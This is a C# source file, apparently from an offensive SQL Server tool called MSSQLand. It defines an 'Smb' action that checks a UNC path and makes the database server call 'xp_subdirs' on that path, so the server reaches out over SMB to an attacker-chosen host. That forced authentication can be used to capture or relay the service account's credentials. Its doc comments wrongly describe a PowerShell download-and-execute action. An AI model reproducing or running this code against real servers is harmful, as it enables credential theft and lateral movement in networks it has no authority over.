using MSSQLand.Services;
using MSSQLand.Utilities;
using System;
using System.Text.RegularExpressions;

namespace MSSQLand.Actions.Network
{
    internal class Smb : BaseAction
    {
        private string _uncPath;

        /// <summary>
        /// Validates the arguments passed to the PowerShellScriptDownloader action.
        /// </summary>
        /// <param name="additionalArguments">The URL of the PowerShell script to download and execute.</param>
        public override void ValidateArguments(string additionalArguments)
        {
            if (string.IsNullOrEmpty(additionalArguments))
            {
                throw new ArgumentException("SMB action requires targeted UNC path (e.g., \\\\172.16.118.218\\shared).");
            }

            // Verify UNC path
            if (!ValidateUNCPath(additionalArguments))
            {
                throw new ArgumentException($"Invalid UNC path format: {additionalArguments}. Ensure it starts with \\\\ and includes a valid host and share name.");
            }

            _uncPath = additionalArguments;
        }

        

        /// <summary>
        /// Executes the PowerShell command to download and run the script from the provided URL.
        /// </summary>
        /// <param name="databaseContext">The ConnectionManager instance to execute the query.</param>
        public override void Execute(DatabaseContext databaseContext)
        {
            Logger.TaskNested($"Sending SMB request to: {_uncPath}");

            string query = $"exec xp_subdirs '{_uncPath}';";

            var response = databaseContext.QueryService.ExecuteScalar(query);
            if (response != null)
            {
                Console.WriteLine(response);
            }

            Logger.Success("SMB request sent");

        }

        /// <summary>
        /// Validates the format of a UNC path.
        /// </summary>
        /// <param name="path">The UNC path to validate.</param>
        /// <returns>True if the path is valid; otherwise, false.</returns>
        private bool ValidateUNCPath(string path)
        {
            // Basic UNC path validation using regular expressions
            const string uncPattern = @"^\\\\[a-zA-Z0-9\-\.]+\\[a-zA-Z0-9\-_\.]+$";
            return Regex.IsMatch(path, uncPattern);
        }
    }
}
